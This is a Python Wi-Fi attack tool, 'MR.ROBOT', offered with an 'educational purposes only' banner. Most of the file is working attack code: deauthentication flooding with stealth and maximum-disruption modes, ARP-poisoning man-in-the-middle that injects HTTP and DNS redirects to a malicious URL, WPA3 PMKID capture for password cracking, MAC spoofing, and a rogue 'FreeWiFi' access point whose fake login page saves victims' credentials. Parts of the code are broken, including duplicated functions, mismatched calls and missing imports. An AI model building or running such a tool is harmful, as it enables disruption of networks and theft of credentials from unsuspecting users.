#!/usr/bin/env python3
import os
import time
import argparse
import threading
import random
import re
import socket
import subprocess
from tabulate import tabulate
from scapy.all import sniff, wrpcap, Dot11, Dot11Deauth, RadioTap, ARP, Ether, sendp
from scapy.all import sendp, IP, TCP, Raw, DNSRR, DNSQR
from http.server import SimpleHTTPRequestHandler, HTTPServer
import logging

# Developer Information
DEVELOPER = "Harshit Mishra"
EMAIL = "securecoderdev@gmail.com"
WEBSITE = "https://mishraharshit.vercel.app"

BANNER = rf"""
  ████╗  ██╗   ██╗ ██████╗ ██████╗  █████╗ ██████╗ ███████╗
 ██╔══██╗██║   ██║██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔════╝
 ███████║██║   ██║██║  ███╗██████╔╝███████║██║  ██║█████╗  
 ██╔══██║██║   ██║██║   ██║██╔═══╝ ██╔══██║██║  ██║██╔══╝  
 ██║  ██║╚██████╔╝╚██████╔╝██║     ██║  ██║██████╔╝███████╗
 ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═════╝ ╚══════╝
              MR.ROBOT - Wi-Fi Security Tool
   Ethical use for educational purposes only.
   Developed by {DEVELOPER} | Email: {EMAIL}
      Visit: {WEBSITE}
"""

# Ensure the script is run as root
def check_root():
    if os.geteuid() != 0:
        print("❌ Error: This script must be run as root!")
        exit(1)

# Detect Wireless Interface
def get_wireless_interface():
    interfaces = os.listdir("/sys/class/net/")
    for iface in interfaces:
        if "wlan" in iface:
            return iface
    print("❌ No Wi-Fi interface found! Connect a wireless adapter.")
    exit(1)

# Get Gateway IP
def get_gateway_ip():
    gateway_ip = os.popen("ip route show default | awk '/default/ {print $3}'").read().strip()
    if gateway_ip:
        return gateway_ip
    else:
        print("❌ Error: Could not determine the gateway IP. Ensure you are connected to a network.")
        exit(1)

# Intelligent Network Scanning with Filtering & Error Handling
def scan_network():
    interface = get_wireless_interface()
    
    print("\n🔍 Scanning network for connected devices...")
    time.sleep(1)

    # Check if required tools are installed
    required_tools = ["arp-scan", "nmap", "macchanger"]
    for tool in required_tools:
        if subprocess.call(["which", tool], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
            print(f"❌ Error: {tool} is not installed. Install it using:")
            print(f"   sudo apt install {tool} -y")
            return []

    # Step 1: Run `arp-scan` to detect active devices on the local network
    print("🛠️ Running ARP scan for local device discovery...")
    arp_scan_result = subprocess.getoutput(f"arp-scan --interface={interface} --localnet")
    arp_devices = re.findall(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F:]{17})", arp_scan_result)

    # Step 2: Run `nmap` for detailed device info
    print("🛠️ Running Nmap scan for additional discovery...")
    nmap_result = subprocess.getoutput(f"nmap -sn 192.168.1.0/24")
    nmap_devices = re.findall(r"Nmap scan report for (\d+\.\d+\.\d+\.\d+)", nmap_result)

    # Step 3: Merge both scan results
    detected_devices = {}
    for ip, mac in arp_devices:
        detected_devices[ip] = mac
    for ip in nmap_devices:
        if ip not in detected_devices:
            detected_devices[ip] = "Unknown MAC"

    if not detected_devices:
        print("❌ No devices found on the local network!")
        return []

    # Step 4: Identify vendors using `macchanger`
    print("\n🔍 Identifying device manufacturers...")
    final_devices = []
    for index, (ip, mac) in enumerate(detected_devices.items(), start=1):
        vendor_info = "Unknown"
        if mac != "Unknown MAC":
            try:
                vendor_lookup = subprocess.getoutput(f"macchanger -l | grep {mac[:8]}")
                if vendor_lookup:
                    vendor_info = vendor_lookup.split(" ", 1)[1]
            except Exception as e:
                print(f"⚠️ Error during MAC lookup: {e}")
                vendor_info = "Unknown"

        final_devices.append((index, ip, mac, vendor_info))

    # Step 5: Automatically find your own machine's IP address
    own_ip = get_own_ip()

    print(f"\n🔧 Your own machine's IP address: {own_ip}")
    
    # Step 6: Ask user for IP address filter, excluding own IP
    ip_filter = input(f"\nEnter an IP address to filter (excluding {own_ip}) or press Enter to show all devices: ").strip()
    
    if ip_filter and ip_filter != own_ip:
        final_devices = [device for device in final_devices if device[1] == ip_filter]
        if not final_devices:
            print(f"❌ No devices found with IP address {ip_filter}.")
            return []
    elif ip_filter == own_ip:
        print("❌ Your own machine's IP address cannot be filtered.")
    
    # Step 7: Filter Devices by Known MAC Address or Show All
    print("\n🛠️ Filtering Devices by Known MAC Address or Show All?")
    print("[1] Show Devices with Known MAC Address")
    print("[2] Show All Devices")
    filter_choice = input("Enter your choice: ").strip()

    if filter_choice == "1":
        final_devices = [device for device in final_devices if device[2] != "Unknown MAC"]
        print("\n📡 Devices with Known MAC Address:")
    elif filter_choice == "2":
        print("\n📡 All Detected Devices:")
    else:
        print("❌ Invalid selection. Showing all devices.")
    
    # Step 8: Filter & categorize devices
    print("\n🛠️ Filtering Devices by Local & External Network...")
    time.sleep(1)

    local_devices = []
    external_devices = []

    for device in final_devices:
        index, ip, mac, vendor = device
        if ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172.16.") or ip.startswith("172.31."):
            local_devices.append(device)
        else:
            external_devices.append(device)

    # Step 9: Display results in an interactive table
    print("\n📡 Detected Local Network Devices:")
    print(tabulate(local_devices, headers=["No.", "IP Address", "MAC Address", "Vendor"], tablefmt="fancy_grid"))

    if external_devices:
        print("\n🌐 External Network Devices:")
        print(tabulate(external_devices, headers=["No.", "IP Address", "MAC Address", "Vendor"], tablefmt="fancy_grid"))

    return final_devices

# Select Target Device from List
def select_target(devices):
    if not devices:
        print("❌ No devices available for selection.")
        return None, None

    try:
        choice = int(input("\nEnter the number of the target device: ")) - 1
        # Return IP and MAC from the selected device
        selected_device = devices[choice]
        return selected_device[1], selected_device[2]  # Returning IP and MAC
    except (IndexError, ValueError):
        print("❌ Invalid selection.")
        return None, None


# Helper function to get wireless interface (you can customize this function)
def get_wireless_interface():
    interfaces = os.listdir("/sys/class/net/")
    for iface in interfaces:
        if "wlan" in iface:
            return iface
    print("❌ No Wi-Fi interface found. Please connect a wireless adapter.")
    exit(1)

# Helper function to get your own IP address
def get_own_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        # Connect to a known host to get your IP
        s.connect(('8.8.8.8', 80))  # Google DNS
        ip = s.getsockname()[0]
    except Exception:
        ip = "Unknown"
    finally:
        s.close()
    return ip

# Enable Monitor Mode
def enable_monitor_mode(interface):
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"ifconfig {interface} up")
    print(f"✅ {interface} set to Monitor Mode.")

# Intelligent Deauthentication Attack with Automatic BSSID Detection
def deauth_attack(interface, target_mac):
    if not validate_mac(target_mac):
        print("❌ Invalid MAC Address. Please enter a valid target.")
        return

    print(f"\n🚀 Starting Ultra-Intelligent Deauthentication Attack on {target_mac}...")

    # Step 1: Enable Monitor Mode & Spoof MAC Address
    enable_monitor_mode(interface)
    spoof_mac(interface)

    # Step 2: Automatically detect BSSID (Access Point MAC Address)
    bssid = detect_bssid(interface, target_mac)
    if not bssid:
        print(f"❌ Could not find BSSID for target MAC {target_mac}. Please ensure the device is connected to a network.")
        return

    print(f"🔧 BSSID (AP MAC) Detected: {bssid}")

    # Step 3: Detect WPA3 & Management Frame Protection (MFP) and Attempt Bypass
    print("🛡️ Checking for WPA3 & MFP (Management Frame Protection)...")
    if detect_mfp(interface, bssid):
        print("⚠️ MFP Detected. Deauthentication attack may not work!")
        print("🔍 Attempting WPA3 PMKID Capture...")
        capture_pmkid(interface, bssid)
        return

    # Step 4: Identify Target's Channel (for optimal packet sending)
    channel = get_wifi_channel(interface, bssid)
    if channel:
        print(f"🔄 Switching {interface} to channel {channel}...")
        os.system(f"iwconfig {interface} channel {channel}")
    else:
        print("⚠️ Warning: Unable to determine the target Wi-Fi channel.")

    # Step 5: Choose Attack Mode Based on Network Response
    print("\n🔧 Choose Attack Mode:")
    print("[1] Smart Mode (AI Adjusts Attack Based on Network Response)")
    print("[2] Stealth Mode (Slow, Untraceable Attack)")
    print("[3] Aggressive Mode (Maximum Disruption)")
    print("[4] Continuous (Runs Until Stopped)")

    mode = input("Enter your choice: ")
    if mode == "1":
        packet_count = random.randint(50, 300)  # AI mode randomization
        interval = random.uniform(0.05, 0.2)  # Adaptive timing for stealth
    elif mode == "2":
        packet_count = 50  # Low-frequency to avoid IDS
        interval = 0.5
    elif mode == "3":
        packet_count = 1000  # High disruption
        interval = 0.05
    elif mode == "4":
        packet_count = None  # Infinite attack loop
        interval = 0.1
    else:
        print("❌ Invalid choice, defaulting to Smart Mode.")
        packet_count = random.randint(50, 300)
        interval = random.uniform(0.05, 0.2)

    # Step 6: Build the Deauthentication Packet
    deauth_pkt = RadioTap() / Dot11(addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)

    # Step 7: Begin Attack in Separate Thread
    attack_thread = threading.Thread(target=send_deauth_packets, args=(interface, deauth_pkt, packet_count, interval))
    attack_thread.start()

# Send Deauthentication Packets with AI & Dynamic Adjustments
def send_deauth_packets(interface, deauth_pkt, packet_count, interval):
    sent_packets = 0
    print("\n📡 Attack Running... Press Ctrl+C to Stop.\n")
    try:
        if packet_count:
            for i in range(packet_count):
                sendp(deauth_pkt, iface=interface, count=1, inter=interval, verbose=False)
                sent_packets += 1
                print(f"📡 Packets Sent: {sent_packets}/{packet_count}", end="\r")
        else:
            while True:  # Continuous Mode
                sendp(deauth_pkt, iface=interface, count=1, inter=interval, verbose=False)
                sent_packets += 1
                print(f"📡 Continuous Attack... Packets Sent: {sent_packets}", end="\r")
    except KeyboardInterrupt:
        print("\n⚠️ Attack Stopped by User.")
    except Exception as e:
        print(f"\n❌ Error: {e}")

    print("\n✅ Attack Complete.")

# Automatically Detect BSSID for Target MAC Address
def detect_bssid(interface, target_mac):
    print(f"🔍 Scanning network to find BSSID for target MAC {target_mac}...")
    scan_result = os.popen(f"iwlist {interface} scan").read()
    match = re.search(rf"Address: ([0-9a-fA-F:]+).*?Cell \d+ - Address: ([0-9a-fA-F:]+).*?ESSID:.*?Signal level.*?Encryption key:on", scan_result, re.DOTALL)
    
    # Find BSSID associated with target MAC address
    for line in scan_result.split("\n"):
        if target_mac in line:
            bssid_match = re.search(r"Address: ([0-9a-fA-F:]+)", line)
            if bssid_match:
                return bssid_match.group(1)
    return None

# Check if Management Frame Protection (MFP) is enabled
def detect_mfp(interface, bssid):
    scan_result = os.popen(f"iwlist {interface} scan").read()
    if "Management Frame Protection" in scan_result:
        return True
    return False

# Capture WPA3 PMKID for Cracking
def capture_pmkid(interface, bssid):
    print(f"🛡️ Capturing PMKID Handshake for WPA3 Attack on {bssid}...")
    os.system(f"hcxdumptool -i {interface} --enable_status=3 -o pmkid_capture.pcap")
    print("✅ PMKID Capture Complete. Use Hashcat for Cracking WPA3 Password.")

# Validate MAC Address Format
def validate_mac(mac):
    return bool(re.match(r"([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}", mac))

# Get the Wi-Fi Channel of the Target AP
def get_wifi_channel(interface, bssid):
    scan_result = os.popen(f"iwlist {interface} scan").read()
    match = re.search(rf"Cell \d+ - Address: {bssid}.*?Channel:(\d+)", scan_result, re.DOTALL)
    return match.group(1) if match else None

# Spoof MAC Address for Stealth Mode
def spoof_mac(interface):
    random_mac = "00:" + ":".join(["%02x" % random.randint(0, 255) for _ in range(5)])
    os.system(f"ifconfig {interface} down")
    os.system(f"macchanger -m {random_mac} {interface}")
    os.system(f"ifconfig {interface} up")
    print(f"🔄 MAC Address changed to {random_mac}")

# Enable Monitor Mode for Packet Injection
def enable_monitor_mode(interface):
    os.system(f"ifconfig {interface} down")
    os.system(f"iwconfig {interface} mode monitor")
    os.system(f"ifconfig {interface} up")
    print(f"✅ {interface} set to Monitor Mode.")
    
# Ultra-Advanced MITM Attack with Full URL Redirection and Traffic Sniffing
def mitm_attack(interface, target_ip, gateway_ip, user_redirect_url):
    print(f"🚀 Starting Ultra-Advanced MITM Attack on {target_ip}...\n")

    # Step 1: Begin ARP Poisoning on the target and gateway
    def arp_poison():
        while True:
            # ARP Poisoning: Target → Gateway
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=target_ip, psrc=gateway_ip), iface=interface, verbose=False)
            # ARP Poisoning: Gateway → Target
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=gateway_ip, psrc=target_ip), iface=interface, verbose=False)
            time.sleep(random.uniform(1.5, 3))  # Randomize the interval to avoid detection

    # Step 2: Thread the ARP Poisoning function
    poisoning_thread = threading.Thread(target=arp_poison, daemon=True)
    poisoning_thread.start()

    # Step 3: Sniff and inject packets into the target's traffic
    def sniff_and_inject():
        print("\n🔍 Capturing traffic between Target and Gateway...")
        sniff(iface=interface, prn=lambda pkt: inject_custom_packets(pkt, target_ip, user_redirect_url), filter=f"ip host {target_ip} or ip host {gateway_ip}")

    # Step 4: Analyze and inject custom payloads (redirecting to a malicious URL)
    def inject_custom_packets(packet, target_ip, user_redirect_url):
        if packet.haslayer(IP):
            ip_src = packet[IP].src
            ip_dst = packet[IP].dst

            # Condition to only modify traffic from target to gateway
            if ip_src == target_ip and ip_dst == gateway_ip:
                print(f"⚠️ Intercepting traffic from {target_ip} to {gateway_ip}...")
                
                # Inject malicious HTTP redirection header
                fake_payload = Raw(load=f"HTTP/1.1 301 Moved Permanently\r\nLocation: {user_redirect_url}\r\n\r\n")
                inject_packet = IP(src=ip_src, dst=ip_dst) / TCP(dport=80, sport=443, flags="PA") / fake_payload
                sendp(inject_packet, iface=interface, verbose=False)
                print(f"✅ Fake HTTP redirect injected into target traffic towards {user_redirect_url}.")

            # Modify incoming traffic from Gateway to Target
            elif ip_src == gateway_ip and ip_dst == target_ip:
                print(f"⚠️ Intercepting traffic from {gateway_ip} to {target_ip}...")

                # Modify DNS responses to redirect URLs
                if packet.haslayer(DNSQR):
                    dns_query = packet[DNSQR].qname.decode()
                    # Intercept all DNS queries to redirect to malicious IP
                    if dns_query:
                        dns_response = DNSRR(rrname=dns_query, rdata=user_redirect_url)  # Redirect DNS to malicious URL
                        inject_packet = IP(src=ip_src, dst=ip_dst) / UDP(dport=53, sport=53) / packet[DNS] / dns_response
                        sendp(inject_packet, iface=interface, verbose=False)
                        print(f"✅ DNS redirect injected for {dns_query}.")

                # Inject fake HTTP request to redirect user
                custom_data = Raw(load=f"GET /malicious-path HTTP/1.1\r\nHost: vulnerable-site.com\r\n\r\n")
                inject_packet = IP(src=ip_src, dst=ip_dst) / TCP(dport=443, sport=80, flags="PA") / custom_data
                sendp(inject_packet, iface=interface, verbose=False)
                print("✅ Malicious HTTP request injected into gateway traffic.")

    # Step 5: Start sniffing and injecting packets
    sniff_thread = threading.Thread(target=sniff_and_inject, daemon=True)
    sniff_thread.start()

    # Step 6: Real-time status updates
    print("✅ MITM attack active. Press Ctrl+C to stop.\n")
    try:
        while True:
            time.sleep(5)
            print("💻 MITM Attack Running: Poisoning ARP, redirecting HTTP traffic...")
            time.sleep(1)
    except KeyboardInterrupt:
        print("⚠️ MITM Attack Stopped by User.")
        exit()


# Spoof MAC Address for Stealth
def spoof_mac(interface):
    random_mac = "00:" + ":".join(["%02x" % random.randint(0, 255) for _ in range(5)])
    os.system(f"ifconfig {interface} down")
    os.system(f"macchanger -m {random_mac} {interface}")
    os.system(f"ifconfig {interface} up")
    print(f"🔄 MAC Address changed to {random_mac}")



# Function to ask user for the redirect URL
def get_redirect_url():
    print("\n🔧 Enter the URL you want to redirect the target to.")
    print("Example: https://malicious-site.com")
    return input("Redirect URL: ")


# Main function to start the attack

def main_menu():
    while True:
        print("\n🛠️ Select an operation:")
        print("[1] Start MITM Attack")
        print("[2] Spoof MAC Address")
        print("[3] Enable Monitor Mode")
        print("[4] Exit")

        choice = input("\nEnter your choice: ")

        if choice == "1":
            interface = input("Enter the wireless interface (e.g., wlan0): ")
            target_ip = input("Enter the target IP address (victim's device): ")
            gateway_ip = input("Enter the gateway IP address (your router's IP): ")

            user_redirect_url = get_redirect_url()

            mitm_attack(interface, target_ip, gateway_ip, user_redirect_url)

        elif choice == "2":
            interface = input("Enter the wireless interface (e.g., wlan0): ")
            spoof_mac(interface)

        elif choice == "3":
            interface = input("Enter the wireless interface (e.g., wlan0): ")
            enable_monitor_mode(interface)

        elif choice == "4":
            print("👋 Exiting... Stay safe!")
            exit()

        else:
            print("❌ Invalid choice, please try again.")




    
# Configure logging
logging.basicConfig(filename='attack_log.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def enable_monitor_mode(interface):
    """Enable monitor mode on the given interface."""
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        if interface not in result.stdout:
            print(f"🚀 Enabling Monitor Mode on {interface}")
            os.system(f"ip link set {interface} down")
            os.system(f"iw dev {interface} set type monitor")
            os.system(f"ip link set {interface} up")
        else:
            print(f"{interface} is already in monitor mode.")
    except Exception as e:
        print(f"❌ Error enabling monitor mode: {e}")
        logging.error(f"Error enabling monitor mode: {e}")

def get_least_congested_channel(interface):
    """Scan for the least congested channel."""
    try:
        print("🛠 Scanning for the least congested channel...")
        result = subprocess.run(['iwlist', interface, 'scan'], capture_output=True, text=True)
        channels = {}
        for line in result.stdout.split('\n'):
            if 'Channel' in line:
                channel = line.split(' ')[-1]
                if channel not in channels:
                    channels[channel] = 0
                channels[channel] += 1
        least_congested_channel = min(channels, key=channels.get)
        print(f"🚀 Least congested channel is: {least_congested_channel}")
        return least_congested_channel
    except Exception as e:
        print(f"❌ Error scanning channels: {e}")
        logging.error(f"Error scanning channels: {e}")
        return 6  # Default to channel 6 if there's an error

def save_credentials(data):
    """Save captured login credentials to a text file."""
    try:
        with open('captured_credentials.txt', 'a') as file:
            file.write(data + "\n")
        print(f"⚠️ Captured credentials: {data}")
        logging.info(f"Captured credentials: {data}")
    except Exception as e:
        print(f"❌ Error saving credentials: {e}")
        logging.error(f"Error saving credentials: {e}")

def start_fake_login_page():
    """Start a fake login page server to capture user credentials."""
    try:
        # Enhanced HTML for the login page with social media login options
        login_html = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Login</title>
            <style>
                body { font-family: Arial, sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .container { background: white; padding: 20px; border-radius: 8px; width: 300px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                h2 { text-align: center; }
                .form-group { margin-bottom: 15px; }
                input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 4px; }
                button { width: 100%; padding: 10px; background-color: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
                button:hover { background-color: #0056b3; }
                .social-buttons { display: flex; justify-content: space-between; }
                .social-buttons button { width: 48%; background-color: #db4437; }
                .social-buttons button:nth-child(2) { background-color: #4267B2; }
                .social-buttons button:hover { background-color: #1a5b8b; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Please login to access the network</h2>
                <form action="/submit" method="POST">
                    <div class="form-group">
                        <label for="username">Username:</label>
                        <input type="text" id="username" name="username" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Password:</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <button type="submit">Login</button>
                    <div class="social-buttons">
                        <button type="button" style="background-color: #db4437;">Login with Google</button>
                        <button type="button" style="background-color: #4267B2;">Login with Facebook</button>
                    </div>
                </form>
            </div>
        </body>
        </html>
        """
        
        # Custom handler to serve the fake login page
        class FakeLoginHandler(SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(login_html.encode())
                else:
                    super().do_GET()

            def do_POST(self):
                if self.path == '/submit':
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length).decode("utf-8")
                    save_credentials(post_data)  # Save captured data to a file
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(b"Login successful! You are now connected.")

        # Start the HTTP server to serve the login page
        server = HTTPServer(('0.0.0.0', 80), FakeLoginHandler)
        print("🚀 Serving fake login page on http://0.0.0.0:80")
        logging.info("Serving fake login page at http://0.0.0.0:80")
        threading.Thread(target=server.serve_forever, daemon=True).start()
    except Exception as e:
        print(f"❌ Error starting fake login page: {e}")
        logging.error(f"Error starting fake login page: {e}")

def monitor_connected_devices(interface, bssid):
    """Monitor connected devices in real-time."""
    try:
        print(f"🔍 Monitoring connected devices to AP {bssid}...")
        
        # Start airodump-ng to monitor clients connecting to the fake AP
        cmd = f"airodump-ng --bssid {bssid} -c {get_least_congested_channel(interface)} {interface}"
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Real-time output
        while True:
            output = process.stdout.readline()
            if output == b"" and process.poll() is not None:
                break
            if output:
                # Parse the output for connected devices
                print(output.decode().strip())
                logging.info(f"Connected device info: {output.decode().strip()}")
            time.sleep(1)  # Adjust the polling rate if needed
    except Exception as e:
        print(f"❌ Error monitoring connected devices: {e}")
        logging.error(f"Error monitoring connected devices: {e}")

def fake_ap(interface, ssid="FreeWiFi", encryption=None, password=None):
    """Create a fake access point (Rogue AP) with optional encryption and serve a fake login page."""
    try:
        # Enable monitor mode on the interface
        enable_monitor_mode(interface)

        # Get the least congested channel for optimal performance
        channel = get_least_congested_channel(interface)

        # Prepare the airbase-ng command
        cmd = f"airbase-ng -e {ssid} -c {channel} {interface}"
        
        if encryption and password:
            if encryption.lower() == "wpa2":
                print("🔒 Securing AP with WPA2 encryption")
                cmd += f" -w {password}"
            elif encryption.lower() == "wep":
                print("🔒 Securing AP with WEP encryption")
                cmd += f" -w {password}"
            else:
                print("⚠️ Unsupported encryption method. Only WPA2 or WEP are supported.")
                logging.warning("Unsupported encryption method selected.")
        
        # Start the rogue AP
        print(f"🛠 Starting Rogue AP with SSID {ssid} on channel {channel}...")
        subprocess.Popen(cmd, shell=True)  # Run airbase-ng in the background
        
        # Get the BSSID (MAC address of the fake AP)
        bssid = "00:11:22:33:44:55"  # This is a placeholder, you should get it from airbase-ng output
        
        print(f"🚀 Fake AP started with BSSID {bssid}. Monitoring connected devices and serving the login page...")
        start_fake_login_page()  # Start the fake login page server
        monitor_connected_devices(interface, bssid)

        logging.info(f"Rogue AP created with SSID {ssid}, channel {channel}, and encryption: {encryption}")
    except Exception as e:
        print(f"❌ Error creating fake AP: {e}")
        logging.error(f"Error creating fake AP: {e}")


# Wi-Fi Sniffing
def sniff_packets(interface, output_pcap):
    print("🔍 Sniffing Wi-Fi packets... (Press Ctrl+C to stop)")
    packets = sniff(iface=interface, count=500)
    wrpcap(output_pcap, packets)
    print(f"✅ Packets saved to {output_pcap}")


import logging

# Global variables to store target details
target_ip = None
target_mac = None
bssid = None
interface = "wlan0"  # Define a default wireless interface (this should be set dynamically in a real scenario)

# Main CLI Function
def main():
    print(BANNER)
    check_root()

    global target_ip, target_mac, bssid, interface

    while True:
        print("\n📌 Choose an operation:")
        print("[1] Scan Network and Select Target")
        print("[2] Perform Deauthentication Attack")
        print("[3] Sniff Wi-Fi Packets")
        print("[4] Start MITM Attack")
        print("[5] Create a Fake AP")
        print("[6] Exit")

        choice = input("\nEnter your choice: ")

        if choice == "1":
            devices = scan_network()
            target_ip, target_mac = select_target(devices)
            if target_ip and target_mac:
                print(f"🎯 Selected Target: {target_ip} ({target_mac})")
                logging.info(f"Target selected: {target_ip} ({target_mac})")
            else:
                print("❌ No target selected. Please try again.")
                logging.warning("No target selected after network scan.")
        
        elif choice == "2":
            if not target_mac:
                print("❌ No target selected! Scan the network first to select a target.")
                logging.warning("No target selected before initiating Deauthentication Attack.")
            else:
                # Automatically detect the BSSID (Access Point MAC) for the selected target MAC
                print(f"🔍 Detecting BSSID for target MAC: {target_mac}")
                bssid = detect_bssid(get_wireless_interface(), target_mac)
        
                if not bssid:
                    print(f"❌ Could not find BSSID for target MAC {target_mac}. Please ensure the device is connected to a network.")
                    logging.error(f"Could not find BSSID for {target_mac}.")
                else:
                    print(f"🔧 Detected BSSID: {bssid}")
                    # Proceed with the deauthentication attack using the detected BSSID
                    deauth_attack(get_wireless_interface(), target_mac, bssid)
                    logging.info(f"Deauthentication Attack started for MAC {target_mac} (BSSID: {bssid})")

        elif choice == "3":
            output_pcap = input("Enter output PCAP file name: ")
            sniff_packets(get_wireless_interface(), output_pcap)
            logging.info(f"Sniffing packets and saving to {output_pcap}")

        elif choice == "4":
            if not target_ip:
                print("❌ No target selected! Scan the network first to select a target.")
                logging.warning("No target selected before initiating MITM Attack.")
            else:
                print("🔥 Ultra-Advanced MITM Attack Tool Activated 🔥")
                main_menu()  # Assuming main_menu is a function defined elsewhere for MITM attack
                logging.info(f"MITM Attack started for target {target_ip}.")

        elif choice == "5":
            ssid = input("Enter Fake AP SSID: ")
            encryption = input("Choose encryption (none, WEP, WPA2): ").lower()
            password = None
            if encryption in ['wep', 'wpa2']:
                password = input("Enter password for encryption: ")
            fake_ap(interface, ssid, encryption, password)  # Assuming fake_ap is defined elsewhere
            logging.info(f"Fake AP created with SSID: {ssid} and encryption: {encryption}.")

        elif choice == "6":
            print("👋 Exiting... Stay safe!")
            logging.info("Program exited.")
            exit(0)

        else:
            print("❌ Invalid choice! Please select a valid option.")
            logging.warning("Invalid menu choice selected.")

# Ensure logging is set up for better error handling and debugging
logging.basicConfig(filename='attack_log.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

if __name__ == "__main__":
    main()


